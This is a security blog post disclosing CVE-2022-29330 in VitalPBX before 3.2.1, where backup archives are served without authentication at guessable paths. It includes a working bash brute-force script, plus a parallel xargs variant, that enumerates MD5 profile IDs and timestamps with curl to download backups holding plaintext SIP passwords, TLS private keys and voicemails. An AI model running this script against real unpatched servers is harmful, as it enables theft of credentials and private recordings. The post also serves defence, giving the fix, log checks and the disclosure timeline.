<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />

<!-- MetaData Section -->
  <title>CVE-2022-29330 - vulnerability in VitalPBX &lt; 3.2.1</title>
<meta name="author"      content="aryliin" /><meta name="author"      content="tbowan" />
<meta name="keywords"    content="Hacking" />

<link rel="canonical" href="https://www.arsouyes.org/articles/2022/2022-06-30-VitalPBX-0day/" />
<link rel="alternate" href="https://www.arsouyes.org/articles/2022/2022-06-30-VitalPBX-0day/index.fr.html" hreflang="fr" />
<link rel="alternate" href="https://www.arsouyes.org/articles/2022/2022-06-30-VitalPBX-0day/index.en.html" hreflang="en" />

  <link rel="alternate" type="application/rss+xml" title="" href="/rss.en.xml" />

<!-- Stylesheet -->
  <style>
:root {
	--black     : #020005ff;
	
	--green : #5BFF89 ;
	--pink  : #591154 ;
	--page-width : 960px ;
	--page-margin:  5% ;
	
}

* {
	box-sizing: border-box;
}

body {
	padding: 0 ;
	margin: 0 ;
	line-height: 1.5 ;
	font-size: min(3vw, 20px) ;
	font-family: georgia, sans serif ;
}

body > header {
  width: 100% ;
	height: 20em ;

	background: var(--black) ;
	color: var(--green) ;
	text-shadow: var(--black) 0 0 10px ;
	padding: 1px ;
	
	font-family: monospace ;
	background-image:url("/style/background-book.jpg") ;
	background-repeat: no-repeat ;
	background-size: cover ;
	background-position: center ;
}

body > header nav {
	display: flex ;
	flex-wrap: wrap ;
	justify-content: space-between ;
	align-items: baseline ;
	
	max-width: var(--page-width) ;
	margin: 0 auto 0 auto ;
	padding: 0 var(--page-margin) 0 var(--page-margin) ;
  border-bottom: solid 1px var(--green) ;
	
	background: rgba(0, 0, 0, 0.4) ;
	box-shadow: #000 0 0 4em 0;
}

body > header h1 {
	margin-top: 0.5ch ;
	margin-bottom: 0.5ch ;
	flex-grow: 1 ;
	text-align: center ;
}

body > header h1 img {
	background: black ;
	border-radius: 100% ;
}

body > header nav ul {
	display: flex ;
	padding: 0 ;
	margin: 0 ;
	justify-content: space-between ;
	flex-grow: 1 ;
}

body > header nav li {
	list-style-type: none ;
	padding: 0 1em 0 1em ;
}

body > header a {
	color: inherit ;
	text-decoration: none ;
}

main {
	background: rgba(255, 255, 255, 0.8) ;

	max-width: var(--page-width) ;
	margin: 0 auto 0 auto ;
	padding: 0 var(--page-margin) 0 var(--page-margin) ;
}

main > header {
	width: 80% ;
	margin: 0 auto 0 auto ;
	padding-top: 2em ;
}

main header h1 {
	text-align: center ;
	margin: 0 0 1em 0;
}

main header ul {
	padding: 0 ;
	margin: 0 ;
	display: flex ;
	justify-content: space-around ;
	border-top: solid 1px #ddd ;
}

main header li {
	list-style-type: none ;
}

main header li img {
	height: 1.5em ;
}

main > header p {
	border-top: solid 1px #ddd ;
	margin: 0 ;
	padding: 1em 0 0 0 ;
}

main > header:after {
	content: "⬡ ⬡ ⬡" ;
	text-align: center ;
	display: block ;
	padding: 1em ;
}



main section h1 {
	border-bottom: solid 1px var(--pink) ;
}

body > footer {
	padding: 1px 0 2em 0;
	margin: 4em 0 0 0 ;
	
	background: var(--black) ;
	background-size: cover ;
	background-position: center ;
	
	color: #ddd ;
	
	font-family: monospace ;
}

body > footer > section {
	max-width: var(--page-width) ;
	margin: 0 auto 0 auto ;
	padding: 0 var(--page-margin) 0 var(--page-margin) ;
	
}

body > footer h1 {
	border-bottom: solid 1px var(--pink) ;
}

body > footer a {
	color: var(--green) ;
}

body > footer nav ul {
	margin: 0 ;
	padding: 0 ;
	display: flex ;
	justify-content: space-around ;
}

body > footer nav li {
	list-style-type: none ;
}


/* ******************************************************************** */

a {
	color: #872F97ff ;
}

dt {
	font-weight: bold ;
	letter-spacing: 2px ;
}

figure {
	text-align: center ;
	margin: 1em 0 ;
}

figure video {
	max-width: 100%;
}

img {
	max-width: 100% ;
	vertical-align: middle ;
}

figcaption {
	color: #888 ;
	font-style: italic ;
	font-size: 80%
}

pre {
	border: solid 1px #888 ;
	box-shadow: #ddd 0 0 1em ;
	padding: 0.5em ;
	overflow: auto;
	background: url("/style/background-hexagons.jpg") ;
	background-size: cover ;
}


blockquote {
	font-style: italic ;
	color: #555 ;
	border-top: solid 1px #888 ;
	border-bottom: solid 1px #888 ;
	padding-left: 1em ;
	margin: 1em 1em 1em 1em ;
}

blockquote cite {
	display: block ;
	font-weight: bold ;
	text-align: right ;
}

form {
	border: solid 1px #888 ;
	background-image: url("/style/background-losange.jpg") ;
	background-repeat: no-repeat ;
	background-size: cover ;
	padding: 0.5em ;
}

label {
	display: block ;
}

textarea {
	width: 100% ;
	min-height: 5em ;
}

table {
	width: 100% ;
	border-collapse: collapse ;
}

th, td {
	border-bottom: 1px solid #bbb;
}

tr:nth-child(odd) td {
	background-color: #eee ;
}

canvas {
	margin: 1em auto 0 auto ;
	display: block;
}

.carousel, .carousel p {
	display: flex ;
	justify-content: space-evenly ;
}

.carousel figure {
	display: inline-block ;
}

.carousel img {
	height: 18em ;
}

/* ********************************************* */

.press dt {
	font-weight: normal ;
}

.press dt img {
	width: 3em ;
	margin: 0 1em 1em 0 ;
	float: left ;
}

.press dd {
	margin-left: 4em ;
}

.press dd:after {
	display: block ;
	clear: left ;
	content:"" ;
	border-bottom: solid 1px #ddd ;
	margin-top: 0.5em ;
	margin-bottom: 0.5em ;
	margin-right: 4em ;
}

/* ********************************************* */

.book dt img {
	width: 7em ;
	margin: 0 1em 1em 0 ;
	float: left ;
}

.book dd {
	margin-left: 8em ;
}

.book dd:after {
	display: block ;
	clear: left ;
	content:"" ;
	border-bottom: solid 1px #ddd ;
	margin-top: 1em ;
	margin-bottom: 1em ;
	margin-right: 8em ;
}

/* ********************************************* */

.newslist ul {
	padding: 0 ;
}
.newslist ul {
	display: table ;
}
.newslist ul>li {
	display: table-row ;
}
.newslist ul>li>* {
	display: table-cell ;
}
.newslist ul>li>*:first-child {
	text-align: right ;
	white-space: nowrap ;
}

.newslist ul>li>*:first-child:after {
	content: "-" ;
	padding: 0 0.5em 0 0.5em ;
}

/* ********************************************* */

.btn {
	display: inline-block ;
	border: solid 1px ;
	border-radius: 0.5em ;
	padding: 0.2em 1em 0.2em 1em ;
	font-family: monospace ;
	margin-top: 0.25em ;
	text-decoration: none ;
	box-shadow: #888 0 0 0.5em ;
}


.columns {
	display: flex ;
	justify-content: space-between ;
	align-items: center ;
}

.column {
	flex-grow: 1;
}</style>
  <style>pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
	pre.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
    color: #aaaaaa;
  }
pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ff0000; font-weight: bold; } /* Alert */
code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
code span.at { color: #7d9029; } /* Attribute */
code span.bn { color: #40a070; } /* BaseN */
code span.bu { color: #008000; } /* BuiltIn */
code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
code span.ch { color: #4070a0; } /* Char */
code span.cn { color: #880000; } /* Constant */
code span.co { color: #60a0b0; font-style: italic; } /* Comment */
code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
code span.do { color: #ba2121; font-style: italic; } /* Documentation */
code span.dt { color: #902000; } /* DataType */
code span.dv { color: #40a070; } /* DecVal */
code span.er { color: #ff0000; font-weight: bold; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #40a070; } /* Float */
code span.fu { color: #06287e; } /* Function */
code span.im { color: #008000; font-weight: bold; } /* Import */
code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
code span.kw { color: #007020; font-weight: bold; } /* Keyword */
code span.op { color: #666666; } /* Operator */
code span.ot { color: #007020; } /* Other */
code span.pp { color: #bc7a00; } /* Preprocessor */
code span.sc { color: #4070a0; } /* SpecialChar */
code span.ss { color: #bb6688; } /* SpecialString */
code span.st { color: #4070a0; } /* String */
code span.va { color: #19177c; } /* Variable */
code span.vs { color: #4070a0; } /* VerbatimString */
code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */</style>


<script>
(function () {
    // On prépare l'exécution (lorsque la page sera chargée)
    window.addEventListener("load", function () {
        var box, div, script, namespaceURI;
        // On vérifie que la page contient du MathML
        namespaceURI = "http://www.w3.org/1998/Math/MathML";
        if (document.body.getElementsByTagNameNS(namespaceURI, "math")[0]) {
            // Création et ajout d'un élément témoin
            document.body.insertAdjacentHTML("afterbegin", "<div style='border: 0; clip: rect(0 0 0 0); height: 1px; margin: -1px; overflow: hidden; padding: 0; position: absolute; width: 1px;'><math xmlns='" + namespaceURI + "'><mpadded height='23px' width='77px'></mpadded></math></div>");
            div = document.body.firstChild;
            // Récupération de la taille du témoins
            box = div.firstChild.firstChild.getBoundingClientRect();
            // Suppression du témoins (ni vu ni connu)
            document.body.removeChild(div);
            // Si le MathML n'est pas géré, on ajoute MathJax
            if (Math.abs(box.height - 23) > 1  || Math.abs(box.width - 77) > 1) {
                script = document.createElement("script");
                script.src = "https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js";
                document.head.appendChild(script);
            }
        }
    });
}());
</script>
</head>
<body>

	<header>
		<nav>
			<h1><a id="logo" href="/">
				<img alt="log" src="/style/logo.png" />&nbsp;Arsouyes.org
			</a></h1>
			<ul>
				<li><a href="/news/"     >News</a></li>
				<li><a href="/articles/" >Articles</a></li>
				<li><a href="/products/" >Projects</a></li>
				<li><a href="https://shop.arsouyes.org"    >Shop</a></li>
			</ul>
		</nav>
		<div id="spacer"></div>
	</header>
	
	<main>
		<header>
			<h1>CVE-2022-29330 - vulnerability in VitalPBX &lt; 3.2.1</h1>
			
			<ul class="meta">
				<li id="author"    >aryliin & tbowan</li>
				<li id="translated">(<a href="index.fr.html">en français</a>)</li>
				<li id="date"      >June 23rd 2022</li>
			</ul>
			<p><strong>Spoiler:</strong> <em>We found that the VitalPBX’s backup
system was not secured enough; the files were readable without
restriction and gave access, in clear text, to passwords, cryptographic
keys and voicemails (amongst other). Hopefully, soon after our
annoucement, the vulnerability was fixed on may 4th (version
3.2.1).</em></p>
		</header>


		<section class="banner">
			<a href="https://shop.arsouyes.org">
				<img src="/images/banners/default-en.png" />
			</a>
		</section>


		<section>
			<p>As we were <del>playing around</del> quietly configuring our VitalPBX
server, we discovered a vulnerability that was relatively easy to
implement and gave us access to data we should not be able to read
freely (<em>i.e.</em> passwords extensions, but not only). Here’s how it
works… and why you should update your version.</p>
<p>Useless for a family, therefore essential for a geek family, we have
an IPBX at home. Among the many software on the market, we have <a
href="/articles/2020/34_Installation_VitalPBX/">installed a VitalPBX</a>
in a virtual machine connected to the rest of our network and
responsible to connect our IP phones (<a
href="/articles/2019/11_Configuration_SIP_IP8815/">IP-8815</a>) and our
analog external lines (via <a
href="/articles/2019/08_Passerelle_telephonique_analogique/">an HX4G
gateway</a> connected to ISP boxes).</p>
<p>Throughout our adventures in this wonderful world of VoIP, we have
experimented lots of tricks that allow us to have, <span
class="citation" data-cites="home">@home</span>, all the features
expected from a business (or hotel) phone system: <a
href="/articles/2019/14_Configurer_groupes_sonnerie/">ring group</a>, <a
href="/articles/2019/13_Configurer_messagerie/">voicemail</a> and <a
href="/articles/2019/37_configurer_IPBX/">turing turing</a> (to avoid
robot calls)…</p>
<figure>
<img src="receptionnistes_Rodrigo_SalomonHC_pixabay.jpg" class="caption"
alt="© Rodrigo SalomonHC @ pixabay" />
<figcaption aria-hidden="true">© Rodrigo SalomonHC @
pixabay</figcaption>
</figure>
<p>Latest: backup (because <a
href="/articles/2021/2021-08-16_Exercices/">backups matters</a>). It is
true that given our infrastructure, this server is quick to install and
the rare data it contains can be lost, so we could have skipped it. The
thing is that as legal experts, we do not see ourselves working for
judges and companies without knowing what we are talking about (and also
because we like setup computers) .</p>
<p>And it was precisely while trying to setup the backup system, or
rather trying to automate it, that we discovered this vulnerability…</p>
<h1 id="vitalpbxs-backup-system">VitalPBX’s Backup System</h1>
<p>The setup of VitalPBX backups is done via the web administration
interface. Once logged in, you need to go to “admin / Tools / Backup
&amp; Restore”. The html form presented by default allows you to create
a new backup profile, with at least a name.</p>
<figure>
<img src="image-20220417103139894.png" class="caption"
alt="Create backup profile" />
<figcaption aria-hidden="true">Create backup profile</figcaption>
</figure>
<p>Once your backup profiles have been created, you can list them via
the menu icon (<img src="image-20220417102417456.png" class="icon"
alt="bullet list icon" />) and then access them by clicking on their
name. The new screen display the configuration form and adds the list of
backups already made (within the limit configured above), and allows you
to restore one (button <img src="image-20220417102907308.png"
class="icon" alt="restore icon" />} on the right in the corresponding
line) and to create new savepoints (button <img
src="image-20220418110617031.png" class="icon" alt="new backup icon" />
at the bottom left of the screen).</p>
<figure>
<img src="image-20220417102756629.png" class="caption"
alt="Detail of a backup profile" />
<figcaption aria-hidden="true">Detail of a backup profile</figcaption>
</figure>
<p>If you want to make backups automatically, you must first add an
automatic task profile (via the “PBX / Tools / cron profiles” menu)
because as long as there is none, the <em>Run automatically</em> field
only contains the <code>disabled</code> value).</p>
<h1 id="backup-vulnerability">Backup Vulnerability</h1>
<p>As you may have seen, the web interface also offers a button <img
src="image-20220417103632334.png" class="icon" alt="download icon" /> to
download a savepoint. By clicking on it, you will then obtain an archive
in <code>tar</code> format which you could save on your side. It’s not
obvious because it hides the details from us (<a
href="/articles/2020/43_Transparent_Opaque_Invisible/">it’s opaque</a>)
but this button just redirects your browser to the file address which
might look like as follows:</p>
<pre><code>https://monipbx.monreseau.lan/static/backup/c4ca4238a0b923820dcc509a6f75849b/vitalpbx-1650260415.tar</code></pre>
<p>It doesn’t look like much seen like that but by checking the details,
you’ll see that it’s going to be a problem.</p>
<h2 id="no-access-control">No access control</h2>
<p>The configuration file of the web server is, as always on <em>Red
Hat</em>, in <code>/etc/httpd/conf.d/</code> and more particularly, the
file <code>vitalpbx.conf</code>. There is the configuration of the
vhosts (virtual web servers) used by vitalpbx, including that of the web
administration interface that interests us and of which here is an
extract:</p>
<pre class="apacheconf"><code>&lt;VirtualHost *:443&gt;
        ...
        &lt;Directory &quot;/var/lib/vitalpbx/static&quot;&gt;
                Require all granted
        &lt;/Directory&gt;
        Alias /static &quot;/var/lib/vitalpbx/static&quot;
        ...
&lt;/VirtualHost&gt;</code></pre>
<p>If we read it from bottom to top, we learn that the
<code>/static</code> prefix in the address is in fact an alias which
corresponds to the <code>/var/lib/vitalpbx/static</code> directory. Then
(or rather <em>before</em>) that this directory is in free access
(<code>Require all granted</code>). No PHP code, no configuration line
or <code>.htaccess</code> file will temper this lack of access
control.</p>
<blockquote>
<p>If we know the address of a file, we can access it without
constraint.</p>
</blockquote>
<p>The only consolation is that the server does not allow directory
listing; if you access
<code>https://monipbx.mynetwork.lan/static/backup/</code>, the system
will return a <em>403 - Forbidden</em> error (you do not have the right
to see the contents of the directory).</p>
<h2 id="deterministic-address">Deterministic address</h2>
<p>We must therefore guess the rest of the address of the backup
files…</p>
<pre><code>c4ca4238a0b923820dcc509a6f75849b/vitalpbx-1650260415.tar</code></pre>
<ul>
<li><p><strong><code>c4ca4238a0b923820dcc509a6f75849b</code></strong>,
is easy to find, just paste it into any search engine to find out that
it is the MD5 sum of the string “1” (the profile ID of the backup). By
doing the test with new profiles we obtain, each time, the MD5 of their
identifier, <code>c81e728d9d4c2f636f067f89cc14862c</code> for 2, then
<code>eccbc87e4b5ce2fe28308fd9f2a7baf3</code> for 3, and so on.</p></li>
<li><p><strong><code>1650260415</code></strong> is more subtle (search
engines won’t help you) but it’s just the timestamp of the file; be the
number of seconds elapsed since January 1<sup>st</sup>, 1970 when the
file was written to disk…</p></li>
</ul>
<p>All you need is to find a profile identifier and a valid timestamp,
two pieces of information whose values follow very simple sequences.</p>
<blockquote>
<p>One can enumerate profiles (consecutive integers) and timestamps
(countdown from <em>now</em>) until a backup file is found.</p>
</blockquote>
<h2 id="exploitation">Exploitation</h2>
<p>Rather than testing these combinations by hand, we can automate all
of this. Here is a solution in bash 😉. In short, we test all timestamps
over the last 24 hours, for the first 10 profiles. And we quit the
script as soon as <code>curl</code> has found something.</p>
<div class="sourceCode" id="cb4"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="va">now</span><span class="op">=</span><span class="va">$(</span><span class="fu">date</span> +%s<span class="va">)</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="va">past</span><span class="op">=</span><span class="va">$(</span><span class="fu">date</span> <span class="at">-d</span> <span class="st">&quot;1 day ago&quot;</span> +%s<span class="va">)</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> profile <span class="kw">in</span> <span class="va">$(</span><span class="fu">seq</span> 1 10<span class="va">)</span> <span class="kw">;</span> <span class="cf">do</span></span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>    <span class="va">md5</span><span class="op">=</span><span class="va">$(</span><span class="bu">echo</span> <span class="at">-n</span> <span class="va">$profile</span> <span class="kw">|</span> <span class="fu">md5sum</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="at">-e</span> <span class="st">&quot;s/ .*//&quot;</span><span class="va">)</span></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>    <span class="ex">curl</span> <span class="at">-sk</span> <span class="st">&quot;https://localhost/static/backup/</span><span class="va">$md5</span><span class="st">/&quot;</span> <span class="dt">\</span></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>        <span class="at">-o</span> /dev/null <span class="at">-w</span> <span class="st">&quot;%{http_code}&quot;</span> <span class="dt">\</span></span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">|</span> <span class="fu">grep</span> <span class="at">-q</span> <span class="st">&quot;404&quot;</span> <span class="kw">&amp;&amp;</span> <span class="cf">continue</span></span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>    </span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> timestamp <span class="kw">in</span> <span class="va">$(</span><span class="fu">seq</span> <span class="va">$now</span> <span class="at">-1</span> <span class="va">$past)</span> <span class="kw">;</span> <span class="cf">do</span></span>
<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>        <span class="ex">curl</span> <span class="at">-fJOsk</span> <span class="st">&quot;https://monipbx.monreseau.lan/static/backup/</span><span class="va">$md5</span><span class="st">/vitalpbx-</span><span class="va">$timestamp</span><span class="st">.tar&quot;</span> <span class="kw">&amp;&amp;</span> <span class="bu">exit</span> 1</span>
<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>    <span class="cf">done</span></span>
<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
<p>If you’re in a hurry, we can speed things up with a bit of
parallelism on the <code>curl</code> calls. For that, we will modify the
inner loop and directly pass the result of <code>seq</code> to
<code>xargs</code>.</p>
<div class="sourceCode" id="cb5"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a>    <span class="bu">export</span> <span class="va">md5</span><span class="op">=</span><span class="va">$(</span><span class="bu">echo</span> <span class="at">-n</span> <span class="va">$profile</span> <span class="kw">|</span> <span class="fu">md5sum</span> <span class="kw">|</span> <span class="fu">sed</span> <span class="at">-e</span> <span class="st">&quot;s/ .*//&quot;</span><span class="va">)</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>    <span class="ex">...</span></span>
<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    <span class="fu">seq</span> <span class="va">$now</span> <span class="at">-1</span> <span class="va">$past</span> <span class="kw">|</span> <span class="fu">xargs</span> <span class="at">-P</span> 10 <span class="at">-I</span> % bash <span class="at">-c</span> <span class="dt">\</span></span>
<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>        <span class="st">&#39;curl -fJOsk &quot;https://localhost/static/backup/$md5/vitalpbx-%.tar&quot; &amp;&amp; exit 255&#39;</span> <span class="dt">\</span></span>
<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>        <span class="kw">||</span> <span class="bu">exit</span> 1</span></code></pre></div>
<h2 id="impact">Impact</h2>
<p>The backup file is a <code>tar</code> archive containing other
archives (<code>gz</code> and <code>tar.gz</code>). And among all that
is saved, some elements are particularly interesting…</p>
<ul>
<li><strong><code>asterisk.sql.gz</code></strong> contains, among other
things, the configuration of some PJSIP extensions and their identifiers
(logins and passwords in plain text),</li>
<li><strong><code>dialplan.tar.gz</code></strong> contains, among other
things, the configuration of the SIP extensions (in
<code>sip__50-1-extensions.conf</code>) and PJSIP (in
<code>pjsip__50-1-extensions.conf</code>), including identifiers (logins
and passwords in plain text),</li>
<li><strong><code>certificates.tar.gz</code></strong> contains the <a
href="/articles/2019/36_PKI/">TLS certificates</a> and their
corresponding private key,</li>
<li><strong><code>voicemail.tar.gz</code></strong>, as its name
suggests, contains voicemail, i.e. the audio messages that callers have
left.</li>
</ul>
<p>So if someone gets their hands on your backup file, they can:</p>
<ul>
<li><strong>Spoof extensions</strong> from the VoIP server, and read
voice messages left by correspondents,</li>
<li><strong>Spoof the server</strong> (<em>e.g.</em> with an HTTPS
proxy) and then recover administrator passwords.</li>
</ul>
<p>And once he has the admin passwords, he can do anything.</p>
<h1 id="fix">Fix</h1>
<p><em>Telesoft S.A</em> fixed this vulnerability in version 3.2.1, once
updated, your server is no longer vulnerable to this attack 🎉.</p>
<blockquote>
<p>In detail, the backup files are no longer directly accessible (they
have been moved to <code>/var/lib/vitalpbx/backup</code>, outside the
directories accessible by apache) and therefore require going through
the user interface in PHP which does authentication checks.</p>
</blockquote>
<p>To find out if your server has been attacked, you can look at the web
server logs. They are in <code>/var/log/httpd</code>, a search on
<code>/static/backup</code> will tell you if any accesses have taken
place. If you see access, and if you want to be careful, change your TLS
keys and passwords (extensions and to be careful, users).</p>
<h1 id="disclosure-log">Disclosure log</h1>
<ul>
<li><strong>Discovery:</strong> April 1<sup>st</sup>, 2022</li>
<li><strong>Communication to editor:</strong> April 1<sup>st</sup>,
2022</li>
<li><strong>Fix:</strong> Mai 4<sup>th</sup> (<a
href="https://vitalpbx.com/vitalpbx-phone-system-change-log/">version
3.2.1 R1</a>).</li>
</ul>
		</section>
	</main>
	
	<footer>
	
		<section class="cta">
			<h1>Do you like our articles ?</h1>
			<p>Then visit our <a href="https://shop.arsouyes.org">shop</a>.
			<h1>Stay informed</h1>
			<p>Our <a href="/news/">news</a> are available on our <a href="/rss.en.xml">RSS feed</a> or <a href="mailto:arsouyes-en-subscribe@arsouyes.org">our mailing list</a>.</p>
		</section>
		
		<section>
			<h1>Fast navigation</h1>
			<nav>
				<ul>
					<li><a href="/news/"     >News</a></li>
					<li><a href="/articles/" >Articles</a></li>
					<li><a href="/products/"    >Projects</a></li>
					<li><a href="https://shop.arsouyes.org">shop</a></li>
					<li><a href="/about/"       >About</a></li>
				</ul>
			</nav>
		</section>
	
	</footer>

</body>
</html>
